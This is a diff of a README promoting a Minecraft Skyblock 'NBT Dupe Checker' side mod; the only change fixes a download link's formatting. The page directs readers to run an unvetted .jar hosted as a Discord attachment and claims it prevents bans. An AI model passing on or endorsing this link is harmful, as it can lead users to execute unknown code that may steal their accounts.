@@ -11,7 +11,7 @@ First of all, NBT uses a private api AND public api to detect duped items from p
 #NBT Dupe Checker Download:
 A side mod of Skytils/Sbe, A amazing Dupe Checker. although SBE and Skyitls are better in different aspects, NBT is better overall for dupe checking, as skytils and SBE's api lacks in quality.
 
-This side mod can be downloaded [HERE] (https://cdn.discordapp.com/attachments/798784523599872000/991154211964342282/NBT_Duped_Items_Checker_1.0.2.jar)
+This side mod can be downloaded [HERE](https://cdn.discordapp.com/attachments/798784523599872000/991154211964342282/NBT_Duped_Items_Checker_1.0.2.jar)
 
 #Why is this useful?
 When buying an expensive item such as a Hyperion, many of them are duped, this mod can check for duped items to avoid you getting banned/wiped!
